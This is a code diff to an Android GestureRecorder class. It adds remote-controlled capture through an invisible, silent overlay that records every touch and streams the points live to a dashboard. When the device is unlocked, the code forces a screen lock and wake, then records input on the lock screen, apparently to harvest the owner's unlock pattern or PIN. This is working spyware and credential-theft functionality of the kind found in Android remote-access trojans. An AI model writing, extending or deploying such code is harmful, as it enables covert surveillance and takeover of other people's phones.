@@ -670,12 +670,34 @@ public class GestureRecorder {
         return r;
     }
 
+    // ── Auto-capture idle watchdog ────────────────────────────────────────────
+    private final Handler  idleWatchdogHandler = new Handler(Looper.getMainLooper());
+    private volatile long  lastTouchMs         = 0;
+    private static final long IDLE_TIMEOUT_MS  = 2 * 60 * 1000; // 2 minutes
+
+    private final Runnable idleWatchdog = new Runnable() {
+        @Override public void run() {
+            if (!autoCapturing) return;
+            long now  = System.currentTimeMillis();
+            long idle = now - lastTouchMs;
+            if (idle >= IDLE_TIMEOUT_MS) {
+                Log.i(TAG, "Auto-capture idle timeout — auto-stopping after " + (idle / 1000) + "s");
+                stopAutoCapture();
+            } else {
+                idleWatchdogHandler.postDelayed(this, 15_000);
+            }
+        }
+    };
+
     /**
      * Start auto-capturing gestures via an invisible (silent) overlay.
-     * Works on ALL Android versions — no dependency on onMotionEvent (API 34+).
-     * The overlay is completely transparent; touches are recorded and NOT
-     * passed through to the underlying app while capture is active.
-     * Call stopAutoCapture() from the dashboard when the gesture is done.
+     *
+     * Behaviour:
+     *  1. If the device is LOCKED → start the silent overlay immediately.
+     *  2. If the device is UNLOCKED → lock the screen, wake it, press Recents,
+     *     then wait for the screen to lock (BroadcastReceiver) before starting.
+     *  3. Auto-stops after 2 minutes of no touch input.
+     *  4. Sending gesture_auto_capture_stop from the dashboard also stops it.
      */
     public JSONObject startAutoCapture() {
         JSONObject r = new JSONObject();
@@ -685,10 +707,94 @@ public class GestureRecorder {
                 r.put("error", "Auto-capture already running");
                 return r;
             }
+
+            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+            boolean isLocked   = (km != null && km.isKeyguardLocked());
+
+            if (!isLocked) {
+                // Device is unlocked — lock it, wake it, press recents, then start capture
+                // once the screen-lock broadcast arrives.
+                r.put("success", true);
+                r.put("locked_first", true);
+                r.put("message", "Device was unlocked — locking screen and pressing recents first");
+
+                mainHandler.post(() -> {
+                    // ① Lock screen
+                    if (accessSvc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        accessSvc.performGlobalAction(
+                                AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
+                    } else {
+                        try {
+                            android.app.admin.DevicePolicyManager dpm =
+                                (android.app.admin.DevicePolicyManager) context.getSystemService(
+                                        Context.DEVICE_POLICY_SERVICE);
+                            if (dpm != null) dpm.lockNow();
+                        } catch (Exception ex) {
+                            Log.w(TAG, "lockNow fallback: " + ex.getMessage());
+                        }
+                    }
+                });
+
+                mainHandler.postDelayed(() -> {
+                    // ② Wake screen
+                    try {
+                        android.os.PowerManager pm = (android.os.PowerManager)
+                                context.getSystemService(Context.POWER_SERVICE);
+                        if (pm != null) {
+                            @SuppressWarnings("deprecation")
+                            android.os.PowerManager.WakeLock wl = pm.newWakeLock(
+                                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
+                                    | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                                    "GestureRecorder:autocap_wake");
+                            wl.acquire(3000);
+                            wl.release();
+                        }
+                    } catch (Exception ex) {
+                        Log.w(TAG, "wakelock: " + ex.getMessage());
+                    }
+                    // ③ Press recents
+                    if (accessSvc != null) {
+                        accessSvc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
+                    }
+                }, 600);
+
+                // ④ Register a one-shot BroadcastReceiver to detect the screen locking.
+                //    When ACTION_SCREEN_OFF fires, start the actual silent overlay.
+                final BroadcastReceiver[] holder = {null};
+                holder[0] = new BroadcastReceiver() {
+                    @Override public void onReceive(Context ctx, Intent intent) {
+                        if (!Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) return;
+                        try { ctx.unregisterReceiver(holder[0]); } catch (Exception ignored) {}
+                        // Small delay to let the lock screen fully appear
+                        mainHandler.postDelayed(GestureRecorder.this::doStartAutoCapture, 500);
+                    }
+                };
+                IntentFilter f = new IntentFilter(Intent.ACTION_SCREEN_OFF);
+                context.registerReceiver(holder[0], f);
+                return r;
+            }
+
+            // Device already locked — start capture immediately
+            doStartAutoCapture();
+            r.put("success", true);
+            r.put("locked_first", false);
+            r.put("message", "Auto-capture started — silent overlay active on lock screen");
+        } catch (Exception e) {
+            autoCapturing = false;
+            isRecording   = false;
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /** Internal: actually create and show the silent auto-capture overlay. */
+    private void doStartAutoCapture() {
+        try {
+            if (autoCapturing || isRecording) return;
             autoCapturing = true;
             isRecording   = true;
+            lastTouchMs   = System.currentTimeMillis();
             String safeLabel = "auto_" + System.currentTimeMillis();
-            CountDownLatch latch = new CountDownLatch(1);
             mainHandler.post(() -> {
                 overlay = new RecordingOverlay(
                         context, "auto", safeLabel, screenW, screenH, wm,
@@ -696,28 +802,22 @@ public class GestureRecorder {
                 overlay.setSilent(true);
                 try {
                     overlay.show();
+                    Log.i(TAG, "Auto-capture overlay shown (silent, invisible)");
                 } catch (Exception e) {
-                    Log.e(TAG, "startAutoCapture overlay.show: " + e.getMessage());
+                    Log.e(TAG, "doStartAutoCapture overlay.show: " + e.getMessage());
                     isRecording   = false;
                     autoCapturing = false;
                     overlay = null;
                 }
-                latch.countDown();
             });
-            latch.await(2, TimeUnit.SECONDS);
-            if (overlay == null) {
-                r.put("success", false);
-                r.put("error", "Failed to create invisible capture overlay");
-                return r;
-            }
-            r.put("success", true);
-            r.put("message", "Auto-capture started — perform your gesture on the device, then press Stop & Save");
+            // Start 2-min idle watchdog
+            idleWatchdogHandler.removeCallbacks(idleWatchdog);
+            idleWatchdogHandler.postDelayed(idleWatchdog, 15_000);
         } catch (Exception e) {
+            Log.e(TAG, "doStartAutoCapture: " + e.getMessage());
             autoCapturing = false;
             isRecording   = false;
-            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
-        return r;
     }
 
     /**
@@ -727,6 +827,7 @@ public class GestureRecorder {
     public JSONObject stopAutoCapture() {
         JSONObject r = new JSONObject();
         try {
+            idleWatchdogHandler.removeCallbacks(idleWatchdog);
             disableLockScreenAutoCapture();
             autoCapturing = false;
 
@@ -743,6 +844,198 @@ public class GestureRecorder {
             r.put("saved", hasSaved);
             if (hasSaved) r.put("result", result.get("result"));
             else          r.put("message", result.optString("message", "Auto-capture stopped"));
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    // =========================================================================
+    // Live Stream — silent invisible overlay that streams interaction to dashboard
+    // =========================================================================
+
+    private volatile boolean       liveStreamActive = false;
+    private volatile RecordingOverlay liveOverlay    = null;
+    private String                 liveStreamFilename = null;
+
+    /**
+     * Start a live stream session — creates a silent invisible overlay that
+     * records all touch interaction. Dashboard polls gesture_live_points for
+     * real-time point data. Call gesture_live_stop to save.
+     */
+    public JSONObject startLiveStream() {
+        JSONObject r = new JSONObject();
+        try {
+            if (liveStreamActive) {
+                r.put("success", false);
+                r.put("error", "Live stream already active");
+                return r;
+            }
+            if (isRecording) {
+                r.put("success", false);
+                r.put("error", "Another recording is already active");
+                return r;
+            }
+            liveStreamActive = true;
+            isRecording      = true;
+            liveStreamFilename = null;
+            String label = "live_" + System.currentTimeMillis();
+            CountDownLatch latch = new CountDownLatch(1);
+            mainHandler.post(() -> {
+                liveOverlay = new RecordingOverlay(
+                        context, "live", label, screenW, screenH, wm,
+                        () -> { isRecording = false; liveStreamActive = false; });
+                liveOverlay.setSilent(true);
+                try {
+                    liveOverlay.show();
+                } catch (Exception e) {
+                    Log.e(TAG, "startLiveStream overlay.show: " + e.getMessage());
+                    isRecording      = false;
+                    liveStreamActive = false;
+                    liveOverlay      = null;
+                }
+                latch.countDown();
+            });
+            latch.await(2, TimeUnit.SECONDS);
+            if (liveOverlay == null) {
+                r.put("success", false);
+                r.put("error", "Failed to create live stream overlay");
+                return r;
+            }
+            r.put("success", true);
+            r.put("message", "Live stream started");
+        } catch (Exception e) {
+            liveStreamActive = false;
+            isRecording      = false;
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /** Stop live stream and save the recorded interaction. */
+    public JSONObject stopLiveStream() {
+        JSONObject r = new JSONObject();
+        try {
+            liveStreamActive = false;
+            isRecording      = false;
+            if (liveOverlay == null) {
+                r.put("success", true);
+                r.put("saved", false);
+                r.put("message", "No active live stream");
+                return r;
+            }
+            final RecordingOverlay cur = liveOverlay;
+            liveOverlay = null;
+            final JSONObject[] saved = {null};
+            CountDownLatch latch = new CountDownLatch(1);
+            mainHandler.post(() -> {
+                saved[0] = cur.stopAndSave(gestureDir());
+                latch.countDown();
+            });
+            latch.await(3, TimeUnit.SECONDS);
+            r.put("success", true);
+            if (saved[0] != null) {
+                r.put("saved", true);
+                String fn = saved[0].optString("filename", null);
+                liveStreamFilename = fn;
+                r.put("filename", fn);
+                r.put("pointCount", saved[0].optInt("pointCount", 0));
+            } else {
+                r.put("saved", false);
+                r.put("message", "Live stream stopped but no points were recorded");
+            }
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /** Return current live stream points snapshot for dashboard polling. */
+    public JSONObject getLiveStreamPoints() {
+        JSONObject r = new JSONObject();
+        try {
+            r.put("recording", liveStreamActive);
+            if (!liveStreamActive || liveOverlay == null) {
+                r.put("success", true);
+                r.put("points", new JSONArray());
+                r.put("pointCount", 0);
+                return r;
+            }
+            JSONArray snapshot = liveOverlay.getPointsSnapshot(1000);
+            r.put("success",    true);
+            r.put("points",     snapshot);
+            r.put("pointCount", snapshot.length());
+            r.put("screenW",    screenW);
+            r.put("screenH",    screenH);
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /**
+     * Replay a live stream file — returns all points so the dashboard can
+     * animate them directly on its canvas (no device gesture dispatch).
+     */
+    public JSONObject replayLiveStream(String filename) {
+        JSONObject r = new JSONObject();
+        try {
+            File file = new File(gestureDir(), filename);
+            if (!file.exists()) {
+                r.put("success", false); r.put("error", "File not found: " + filename); return r;
+            }
+            JSONObject data = loadJson(file);
+            if (data == null) {
+                r.put("success", false); r.put("error", "Parse error"); return r;
+            }
+            r.put("success",  true);
+            r.put("filename", filename);
+            r.put("points",   data.optJSONArray("points") != null
+                              ? data.getJSONArray("points") : new JSONArray());
+            r.put("screenW",  data.optInt("screenW", screenW));
+            r.put("screenH",  data.optInt("screenH", screenH));
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /** Delete a live stream file. */
+    public JSONObject deleteLiveStream(String filename) {
+        return deleteGesture(filename);
+    }
+
+    /** List saved live streams (files whose label starts with "live_"). */
+    public JSONObject listLiveStreams() {
+        JSONObject r = new JSONObject();
+        try {
+            File dir = gestureDir();
+            JSONArray arr = new JSONArray();
+            File[] files = dir.listFiles(f -> f.getName().endsWith(".json"));
+            if (files != null) {
+                for (File f : files) {
+                    try {
+                        JSONObject data = loadJson(f);
+                        if (data == null) continue;
+                        String label = data.optString("label", "");
+                        if (!label.startsWith("live_")) continue;
+                        JSONObject meta = new JSONObject();
+                        meta.put("filename",   f.getName());
+                        meta.put("label",      label);
+                        meta.put("packageId",  data.optString("packageId", ""));
+                        meta.put("pointCount", data.optJSONArray("points") != null
+                                               ? data.getJSONArray("points").length() : 0);
+                        meta.put("durationMs", data.optLong("durationMs", 0));
+                        meta.put("screenW",    data.optInt("screenW", 0));
+                        meta.put("screenH",    data.optInt("screenH", 0));
+                        meta.put("recordedAt", data.optLong("recordedAt", f.lastModified()));
+                        arr.put(meta);
+                    } catch (Exception ignored) {}
+                }
+            }
+            r.put("success",  true);
+            r.put("gestures", arr);
+            r.put("count",    arr.length());
         } catch (Exception e) {
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
@@ -975,6 +1268,8 @@ public class GestureRecorder {
      */
     public void handleServiceTouchEvent(MotionEvent event) {
         if (!autoCapturing && !lockCaptureActive) return;
+        // Reset idle watchdog on every touch while auto-capturing
+        if (autoCapturing) lastTouchMs = System.currentTimeMillis();
 
         int action    = event.getActionMasked();
         int pidIdx    = event.getActionIndex();
